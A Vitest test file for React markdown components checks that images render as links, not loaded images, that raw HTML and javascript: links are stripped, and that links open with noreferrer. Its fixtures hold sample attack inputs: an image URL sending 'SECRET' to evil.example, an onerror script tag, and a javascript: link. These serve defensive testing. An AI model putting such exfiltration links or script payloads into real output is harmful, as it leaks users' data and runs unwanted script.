// @vitest-environment happy-dom
import { cleanup, fireEvent, render, screen } from "@testing-library/react";
import { afterEach, expect, it } from "vitest";
import { MarkdownDoc, Prose } from "../../../app/src/components/markdown.js";

afterEach(cleanup);

it("shows an image as a link to it and never loads it", () => {
	const { container } = render(
		<Prose>{"![tracker](https://evil.example/x.png?d=SECRET)"}</Prose>,
	);
	expect(container.querySelector("img")).toBeNull();
	const link = screen.getByRole("link", { name: "tracker" });
	expect(link.getAttribute("href")).toBe("https://evil.example/x.png?d=SECRET");
	expect(link.getAttribute("rel")).toBe("noreferrer noopener");
});

it("drops raw HTML and javascript: links", () => {
	const { container } = render(
		<Prose>
			{
				'<img src="https://evil.example/x.png" onerror="alert(1)">\n\n[click](javascript:alert(1))'
			}
		</Prose>,
	);
	expect(container.querySelector("img")).toBeNull();
	expect(container.innerHTML).not.toContain("onerror");
	expect(
		screen.getByText("click").closest("a")?.getAttribute("href") ?? "",
	).not.toContain("javascript:");
});

it("opens links in a new tab, without telling the target where they came from", () => {
	render(<Prose>{"[docs](https://example.com)"}</Prose>);
	const link = screen.getByRole("link", { name: "docs" });
	expect(link.getAttribute("target")).toBe("_blank");
	expect(link.getAttribute("rel")).toBe("noreferrer noopener");
});

it("opens a factory file in place, then shows its source", () => {
	const text = "# Implementer\n\nWrite **the code**.";
	render(
		<MarkdownDoc
			path="openfabriq/agents/implementer/agent.md"
			text={text}
			title="Brief"
		/>,
	);
	expect(screen.queryByText("the code")).toBeNull();

	fireEvent.click(screen.getByRole("button", { name: /Brief/ }));
	expect(screen.getByText("the code").tagName).toBe("STRONG");

	fireEvent.click(screen.getByRole("button", { name: "Markdown" }));
	expect(screen.getByText(/Write \*\*the code\*\*\./).tagName).toBe("PRE");
});
